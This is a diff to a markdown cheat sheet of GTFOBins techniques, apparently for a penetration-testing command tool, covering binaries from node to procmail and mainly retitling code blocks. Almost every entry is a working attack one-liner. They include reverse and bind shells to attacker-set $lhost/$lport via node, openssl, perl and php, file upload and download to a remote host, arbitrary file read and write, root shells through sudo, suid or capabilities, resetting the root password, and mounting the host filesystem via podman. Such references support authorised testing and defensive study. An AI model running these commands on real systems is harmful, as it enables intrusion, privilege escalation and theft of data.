+```sh title:"GTFOBins node reverse-shell - suid override (suid variant)"
 node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
 require("net").connect($lport, "$lhost", function () {
   this.pipe(sh.stdin);
@@ -6360,7 +6458,7 @@ import lports
 
 Bind a shell to a local port for the attacker to connect to.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins node bind-shell (sudo / suid / unprivileged)"
 node -e 'sh = require("child_process").spawn("/bin/sh");
 require("net").createServer(function (client) {
   client.pipe(sh.stdin);
@@ -6374,7 +6472,9 @@ import lports
 
 #### node bind-shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins node bind-shell - suid override (suid variant)"
 node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
 require("net").createServer(function (client) {
   client.pipe(sh.stdin);
@@ -6390,7 +6490,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins node file-read (sudo / suid / unprivileged)"
 node -e 'process.stdout.write(require("fs").readFileSync("$file_in"))'
 ```
 <!-- cheat
@@ -6401,7 +6501,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins node file-write (sudo / suid / unprivileged)"
 node -e 'require("fs").writeFileSync("$file_out", "$data")'
 ```
 <!-- cheat
@@ -6413,7 +6513,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins node download (sudo / suid / unprivileged)"
 node -e 'require("http").get("$scheme://$lhost$file_in", res => res.pipe(require("fs").createWriteStream("$file_out")))'
 ```
 <!-- cheat
@@ -6427,7 +6527,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins node upload (sudo / suid / unprivileged)"
 node -e 'require("fs").createReadStream("$file_in").pipe(require("http").request("$scheme://$lhost$file_out"))'
 ```
 <!-- cheat
@@ -6443,7 +6543,7 @@ var file_out
 
 This creates a `nohup.out` file in the current working directory.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nohup shell (sudo / suid / unprivileged)"
 nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'
 ```
 <!-- cheat
@@ -6451,7 +6551,9 @@ nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'
 
 #### nohup shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins nohup shell - suid override (suid variant)"
 nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'
 ```
 <!-- cheat
@@ -6461,7 +6563,7 @@ nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'
 
 The `nohup.out` file contains the standard output and error of the command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nohup command (sudo / suid / unprivileged)"
 nohup $cmd_file
 cat nohup.out
 ```
@@ -6475,7 +6577,7 @@ var cmd_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins npm shell #1 (sudo / unprivileged)"
 npm exec /bin/sh
 ```
 <!-- cheat
@@ -6485,7 +6587,7 @@ npm exec /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins npm shell #2 (sudo / unprivileged)"
 echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
 npm -C . i
 ```
@@ -6496,7 +6598,7 @@ npm -C . i
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins npm shell #3 (sudo / unprivileged)"
 echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
 npm -C . run xxx
 ```
@@ -6509,7 +6611,7 @@ npm -C . run xxx
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins nroff shell (sudo / unprivileged)"
 echo /bin/sh >groff
 chmod +x groff
 GROFF_BIN_PATH=. nroff
@@ -6521,7 +6623,7 @@ GROFF_BIN_PATH=. nroff
 
 The file is typeset and some warning messages may appear.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins nroff file-read (sudo / unprivileged)"
 nroff $file_in
 ```
 <!-- cheat
@@ -6534,7 +6636,7 @@ var file_in
 
 The shell command can be omitted.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nsenter shell (sudo / suid / unprivileged)"
 nsenter /bin/sh
 ```
 <!-- cheat
@@ -6542,7 +6644,9 @@ nsenter /bin/sh
 
 #### nsenter shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins nsenter shell - suid override (suid variant)"
 nsenter /bin/sh -p
 ```
 <!-- cheat
@@ -6554,7 +6658,7 @@ nsenter /bin/sh -p
 
 The file is actually parsed and lines are leaked through error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ntpdate file-read (sudo / suid / unprivileged)"
 ntpdate -a x -k $file_in -d localhost
 ```
 <!-- cheat
@@ -6573,7 +6677,7 @@ The payloads are compatible with GUI mode.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins octave shell (sudo / suid / unprivileged)"
 octave-cli --eval 'system("/bin/sh")'
 ```
 <!-- cheat
@@ -6583,7 +6687,7 @@ octave-cli --eval 'system("/bin/sh")'
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins octave file-read (sudo / suid / unprivileged)"
 octave-cli --eval 'format none; fid = fopen("$file_in"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
 ```
 <!-- cheat
@@ -6594,7 +6698,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins octave file-write (sudo / suid / unprivileged)"
 octave-cli --eval 'fid = fopen("$file_out", "w"); fputs(fid, "$data"); fclose(fid);'
 ```
 <!-- cheat
@@ -6608,7 +6712,7 @@ var file_out
 
 Three spaces are added before each character in the read file (wrapped at the specified value, i.e., `999`), and non-printable chars are printed as backslash escape sequences.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins od file-read (sudo / suid / unprivileged)"
 od -An -c -w999 $file_in
 ```
 <!-- cheat
@@ -6621,7 +6725,7 @@ var file_in
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins opencode command (sudo / suid / unprivileged)"
 opencode
 ! $cmd_file
 ```
@@ -6633,7 +6737,7 @@ var cmd_file
 
 This allows to run SQLite queries (`...`) provided that `sqlite3` is installed.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins opencode inherit (inherits from sqlite3) (sudo / unprivileged)"
 opencode db '...'
 ```
 <!-- cheat
@@ -6645,7 +6749,7 @@ opencode db '...'
 
 The shell process is not spawn by `openssl`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins openssl reverse-shell (sudo / suid / unprivileged)"
 mkfifo $tmp_sock
 /bin/sh -i <$tmp_sock 2>&1 | openssl s_client -quiet -connect $lhost:$lport >$tmp_sock
 ```
@@ -6659,7 +6763,7 @@ var tmp_sock
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins openssl file-read (sudo / suid / unprivileged)"
 openssl enc -in $file_in
 ```
 <!-- cheat
@@ -6670,7 +6774,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins openssl file-write #1 (sudo / suid / unprivileged)"
 echo $data | openssl enc -out $file_out
 ```
 <!-- cheat
@@ -6682,7 +6786,7 @@ var file_out
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins openssl file-write #2 (sudo / suid / unprivileged)"
 openssl enc -in $file_in -out $file_out
 ```
 <!-- cheat
@@ -6694,7 +6798,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins openssl download (sudo / suid / unprivileged)"
 openssl s_client -quiet -connect $lhost:$lport >$file_out
 ```
 <!-- cheat
@@ -6707,7 +6811,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins openssl upload (sudo / suid / unprivileged)"
 openssl s_client -quiet -connect $lhost:$lport <$file_in
 ```
 <!-- cheat
@@ -6720,7 +6824,7 @@ var file_in
 
 Load an attacker-supplied shared library.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins openssl library-load (sudo / suid / unprivileged)"
 openssl req -engine ./lib.so
 ```
 <!-- cheat
@@ -6732,7 +6836,7 @@ openssl req -engine ./lib.so
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins openvpn shell (sudo / suid / unprivileged)"
 openvpn --dev null --script-security 2 --up '/bin/sh -s'
 ```
 <!-- cheat
@@ -6740,7 +6844,9 @@ openvpn --dev null --script-security 2 --up '/bin/sh -s'
 
 #### openvpn shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins openvpn shell - suid override (suid variant)"
 openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
 ```
 <!-- cheat
@@ -6750,7 +6856,7 @@ openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
 
 The file is actually parsed and the first partial wrong line is returned in an error message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins openvpn file-read (sudo / suid / unprivileged)"
 openvpn --config $file_in
 ```
 <!-- cheat
@@ -6763,7 +6869,7 @@ var file_in
 
 The command execution is displayed on the virtual console.
 
-```sh title:"sudo"
+```sh title:"GTFOBins openvt command (sudo)"
 openvt -- $cmd_file
 ```
 <!-- cheat
@@ -6776,7 +6882,7 @@ var cmd_file
 
 Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo 'exec /bin/sh' >x.sh fpm -n x -s dir -t deb -a all --before-install x.sh . ```
 
-```sh title:"sudo"
+```sh title:"GTFOBins opkg shell (sudo)"
 rpm opkg install x_1.0_all.deb
 ```
 <!-- cheat
@@ -6788,7 +6894,7 @@ rpm opkg install x_1.0_all.deb
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pandoc file-read (sudo / suid / unprivileged)"
 pandoc -t plain $file_in
 ```
 <!-- cheat
@@ -6799,7 +6905,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pandoc file-write (sudo / suid / unprivileged)"
 echo $data | pandoc -t plain -o $file_out
 ```
 <!-- cheat
@@ -6811,7 +6917,7 @@ var file_out
 
 This allows to run Lua code (`...`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pandoc inherit (inherits from lua) (sudo / suid / unprivileged)"
 echo '...' >$tmp_file
 pandoc -L $tmp_file /dev/null
 ```
@@ -6825,7 +6931,7 @@ var tmp_file
 
 This changes the root password to `x`, so it's now possible to log in using, for example, `su`.
 
-```sh title:"sudo"
+```sh title:"GTFOBins passwd privilege-escalation (sudo)"
 echo -e 'x\nx' | passwd
 ```
 <!-- cheat
@@ -6837,7 +6943,7 @@ echo -e 'x\nx' | passwd
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins paste file-read (sudo / suid / unprivileged)"
 paste $file_in
 ```
 <!-- cheat
@@ -6850,7 +6956,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pax file-read (sudo / suid / unprivileged)"
 pax -w $file_in | tar -xO
 ```
 <!-- cheat
@@ -6863,7 +6969,7 @@ var file_in
 
 This allows to run Python code (`...`).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins pdb inherit (inherits from python) (sudo / unprivileged)"
 echo '...' >$tmp_file
 pdb $tmp_file
 cont
@@ -6878,7 +6984,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pdflatex shell (sudo / suid / unprivileged)"
 pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
 ```
 <!-- cheat
@@ -6888,7 +6994,7 @@ pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write
 
 The read file will be part of the PDF output.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pdflatex file-read (sudo / suid / unprivileged)"
 pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{$file_in}\end{document}'
 pdftotext texput.pdf -
 ```
@@ -6900,7 +7006,7 @@ var file_in
 
 The file can only be written in the current directory, and the `.tex` extension is mandatory.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pdflatex file-write (sudo / suid / unprivileged)"
 pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{$data}\immediate\closeout\tempfile\end{document}'
 ```
 <!-- cheat
@@ -6913,7 +7019,7 @@ var data
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pdftex shell (sudo / suid / unprivileged)"
 pdftex --shell-escape '\write18{/bin/sh}\end'
 ```
 <!-- cheat
@@ -6925,7 +7031,7 @@ pdftex --shell-escape '\write18{/bin/sh}\end'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins perf shell (sudo / suid / unprivileged)"
 perf stat /bin/sh
 ```
 <!-- cheat
@@ -6933,7 +7039,9 @@ perf stat /bin/sh
 
 #### perf shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins perf shell - suid override (suid variant)"
 perf stat /bin/sh -p
 ```
 <!-- cheat
@@ -6945,7 +7053,7 @@ perf stat /bin/sh -p
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"capabilities / sudo / unprivileged"
+```sh title:"GTFOBins perl shell #1 (capabilities / sudo / unprivileged)"
 perl -e 'exec "/bin/sh"'
 ```
 <!-- cheat
@@ -6953,7 +7061,9 @@ perl -e 'exec "/bin/sh"'
 
 #### perl shell #1 - capabilities override
 
-```sh title:"capabilities variant"
+capabilities variant
+
+```sh title:"GTFOBins perl shell #1 - capabilities override (capabilities variant)"
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
 ```
 <!-- cheat
@@ -6963,7 +7073,7 @@ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
 
 The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins perl shell #2 (sudo / unprivileged)"
 PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
 ```
 <!-- cheat
@@ -6973,7 +7083,7 @@ PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins perl reverse-shell (sudo / unprivileged)"
 perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 <!-- cheat
@@ -6985,7 +7095,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins perl file-read (sudo / suid / unprivileged)"
 perl -ne print $file_in
 ```
 <!-- cheat
@@ -6996,7 +7106,7 @@ var file_in
 
 Pull a remote file to disk.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins perl download (sudo / unprivileged)"
 perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>"$lhost",PeerPort=>80,Proto=>"tcp") or die; print $s "GET $file_in HTTP/1.1\r\nHost: $lhost\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "$file_out") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n") { $in_content = 1; } } close($s); close($fh);'
 ```
 <!-- cheat
@@ -7009,7 +7119,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins perl upload (sudo / unprivileged)"
 perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>"$lhost", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "$file_in") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: $lhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection: close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'
 ```
 <!-- cheat
@@ -7023,7 +7133,7 @@ var file_in
 
 This requires to press `Enter` serveral times before the shell is spawn.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins perlbug shell (sudo / unprivileged)"
 perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
 ```
 <!-- cheat
@@ -7035,7 +7145,7 @@ perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pexec shell (sudo / suid / unprivileged)"
 pexec /bin/sh
 ```
 <!-- cheat
@@ -7043,7 +7153,9 @@ pexec /bin/sh
 
 #### pexec shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins pexec shell - suid override (suid variant)"
 pexec /bin/sh -p
 ```
 <!-- cheat
@@ -7055,7 +7167,7 @@ pexec /bin/sh -p
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pg shell (sudo / suid / unprivileged)"
 pg /etc/hosts
 !/bin/sh
 ```
@@ -7066,7 +7178,7 @@ pg /etc/hosts
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pg file-read (sudo / suid / unprivileged)"
 pg $file_in
 ```
 <!-- cheat
@@ -7079,7 +7191,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"capabilities / sudo / suid / unprivileged"
+```sh title:"GTFOBins php shell #1 (capabilities / sudo / suid / unprivileged)"
 php -r 'system("/bin/sh -i");'
 ```
 <!-- cheat
@@ -7087,7 +7199,9 @@ php -r 'system("/bin/sh -i");'
 
 #### php shell #1 - capabilities override
 
-```sh title:"capabilities variant"
+capabilities variant
+
+```sh title:"GTFOBins php shell #1 - capabilities override (capabilities variant)"
 php -r 'posix_setuid(0); system("/bin/sh -i");'
 ```
 <!-- cheat
@@ -7097,7 +7211,7 @@ php -r 'posix_setuid(0); system("/bin/sh -i");'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"capabilities / sudo / suid / unprivileged"
+```sh title:"GTFOBins php shell #2 (capabilities / sudo / suid / unprivileged)"
 php -r 'passthru("/bin/sh -i");'
 ```
 <!-- cheat
@@ -7105,7 +7219,9 @@ php -r 'passthru("/bin/sh -i");'
 
 #### php shell #2 - capabilities override
 
-```sh title:"capabilities variant"
+capabilities variant
+
+```sh title:"GTFOBins php shell #2 - capabilities override (capabilities variant)"
 php -r 'posix_setuid(0); passthru("/bin/sh -i");'
 ```
 <!-- cheat
@@ -7115,7 +7231,7 @@ php -r 'posix_setuid(0); passthru("/bin/sh -i");'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"capabilities / sudo / suid / unprivileged"
+```sh title:"GTFOBins php shell #3 (capabilities / sudo / suid / unprivileged)"
 php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
 ```
 <!-- cheat
@@ -7123,7 +7239,9 @@ php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096
 
 #### php shell #3 - capabilities override
 
-```sh title:"capabilities variant"
+capabilities variant
+
+```sh title:"GTFOBins php shell #3 - capabilities override (capabilities variant)"
 php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
 ```
 <!-- cheat
@@ -7133,7 +7251,7 @@ php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) e
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"capabilities / sudo / suid / unprivileged"
+```sh title:"GTFOBins php shell #4 (capabilities / sudo / suid / unprivileged)"
 php -r 'pcntl_exec("/bin/sh");'
 ```
 <!-- cheat
@@ -7141,7 +7259,9 @@ php -r 'pcntl_exec("/bin/sh");'
 
 #### php shell #4 - capabilities override
 
-```sh title:"capabilities variant"
+capabilities variant
+
+```sh title:"GTFOBins php shell #4 - capabilities override (capabilities variant)"
 php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
 ```
 <!-- cheat
@@ -7149,7 +7269,9 @@ php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
 
 #### php shell #4 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins php shell #4 - suid override (suid variant)"
 php -r 'pcntl_exec("/bin/sh", ["-p"]);'
 ```
 <!-- cheat
@@ -7159,7 +7281,7 @@ php -r 'pcntl_exec("/bin/sh", ["-p"]);'
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins php command #1 (sudo / suid / unprivileged)"
 php -r 'echo shell_exec("$cmd_file");'
 ```
 <!-- cheat
@@ -7170,7 +7292,7 @@ var cmd_file
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins php command #2 (sudo / suid / unprivileged)"
 php -r '$r=array(); exec("$cmd_file", $r); print(join("\n",$r));'
 ```
 <!-- cheat
@@ -7181,7 +7303,7 @@ var cmd_file
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins php command #3 (sudo / suid / unprivileged)"
 php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("$cmd_file", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
 ```
 <!-- cheat
@@ -7192,7 +7314,7 @@ var cmd_file
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins php reverse-shell (sudo / suid / unprivileged)"
 php -r '$sock=fsockopen("$lhost",$lport);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
 ```
 <!-- cheat
@@ -7204,7 +7326,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins php file-read (sudo / suid / unprivileged)"
 php -r 'readfile("$file_in");'
 ```
 <!-- cheat
@@ -7215,7 +7337,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins php file-write (sudo / suid / unprivileged)"
 php -r 'file_put_contents("$file_out", "$data");'
 ```
 <!-- cheat
@@ -7227,7 +7349,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins php download (sudo / suid / unprivileged)"
 php -r '$c=file_get_contents("$scheme://$lhost$file_in"); file_put_contents("$file_out", $c);'
 ```
 <!-- cheat
@@ -7241,7 +7363,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins php upload (sudo / suid / unprivileged)"
 php -S 0.0.0.0:80
 ```
 <!-- cheat
@@ -7253,7 +7375,7 @@ php -S 0.0.0.0:80
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pic shell (sudo / suid / unprivileged)"
 pic -U
 .PS
 sh X sh X
@@ -7265,7 +7387,7 @@ sh X sh X
 
 The output is prefixed with some content.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pic file-read (sudo / suid / unprivileged)"
 pic $file_in
 ```
 <!-- cheat
@@ -7282,7 +7404,7 @@ Alias of [nano](#nano). All techniques from `nano` apply.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pidstat shell (sudo / suid / unprivileged)"
 pidstat -e /bin/sh
 ```
 <!-- cheat
@@ -7290,7 +7412,9 @@ pidstat -e /bin/sh
 
 #### pidstat shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins pidstat shell - suid override (suid variant)"
 pidstat -e /bin/sh -p
 ```
 <!-- cheat
@@ -7302,7 +7426,7 @@ pidstat -e /bin/sh -p
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins pip shell (sudo / unprivileged)"
 pip config --editor '/bin/sh -s' edit
 ```
 <!-- cheat
@@ -7312,7 +7436,7 @@ pip config --editor '/bin/sh -s' edit
 
 This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).  Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:  ``` echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py ```  The `--break-system-packages` flag can be omitted in older systems.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins pip inherit (inherits from python) (sudo / unprivileged)"
 echo '...' >setup.py
 pip install --break-system-packages .
 ```
@@ -7325,7 +7449,7 @@ pip install --break-system-packages .
 
 This allows to run Python code (`...`).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins pipx inherit (inherits from python) (sudo / unprivileged)"
 echo '...' >$script
 pipx run $script
 ```
@@ -7339,7 +7463,7 @@ var script
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins pkexec shell (sudo)"
 pkexec /bin/sh
 ```
 <!-- cheat
@@ -7351,7 +7475,7 @@ pkexec /bin/sh
 
 Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t freebsd -a all --before-install x.sh . ```
 
-```sh title:"sudo"
+```sh title:"GTFOBins pkg command (sudo)"
 pkg install -y --no-repo-update ./x-1.0.txz
 ```
 <!-- cheat
@@ -7363,7 +7487,7 @@ pkg install -y --no-repo-update ./x-1.0.txz
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins plymouth shell (sudo / suid / unprivileged)"
 plymouth ask-for-password --prompt=x --command=/bin/sh
 ```
 <!-- cheat
@@ -7371,7 +7495,9 @@ plymouth ask-for-password --prompt=x --command=/bin/sh
 
 #### plymouth shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins plymouth shell - suid override (suid variant)"
 plymouth ask-for-password --prompt=x --command='/bin/sh -p'
 ```
 <!-- cheat
@@ -7383,7 +7509,7 @@ plymouth ask-for-password --prompt=x --command='/bin/sh -p'
 
 This requires an actual image to be available (e.g., `alpine`) downloading it if not present.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins podman shell (sudo / unprivileged)"
 podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
 ```
 <!-- cheat
@@ -7395,7 +7521,7 @@ podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
 
 This allows to run Python code (`...`).  A valid `pyproject.toml` file must be present in the current working directory, you can create one with `poetry init -n`.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins poetry inherit (inherits from python) (sudo / unprivileged)"
 echo '...' >$tmp_file
 poetry run python $tmp_file
 ```
@@ -7409,7 +7535,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins posh shell (sudo / unprivileged)"
 posh
 ```
 <!-- cheat
@@ -7421,7 +7547,7 @@ posh
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins pr file-read (sudo / suid / unprivileged)"
 pr -T $file_in
 ```
 <!-- cheat
@@ -7434,7 +7560,7 @@ var file_in
 
 The program is picky about the file ownership, and waits for some input.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins procmail command (sudo / unprivileged)"
 echo -e ':0\n| $cmd_file >$tmp_file
 procmail -m $tmp_file
 ```
@@ -7449,7 +7575,7 @@ var tmp_file
 
